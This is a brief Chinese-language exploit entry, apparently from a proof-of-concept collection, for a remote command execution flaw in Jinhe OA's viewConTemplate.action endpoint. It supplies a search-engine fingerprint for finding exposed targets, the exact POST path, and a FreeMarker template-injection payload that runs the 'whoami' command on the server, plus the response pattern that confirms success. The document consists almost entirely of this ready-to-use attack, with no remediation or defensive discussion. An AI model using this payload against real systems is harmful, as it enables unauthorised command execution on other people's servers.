# 金和OAviewConTemplate.actionRCE漏洞

金和OA ｜ 命令执行 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action HTTP/1.1`

**Payload**
```
moduId=1&code=<clob>${"freemarker.template.utility.Execute"?new()("whoami")}</clob>&uuid=1
```
- **响应特征**：200 clob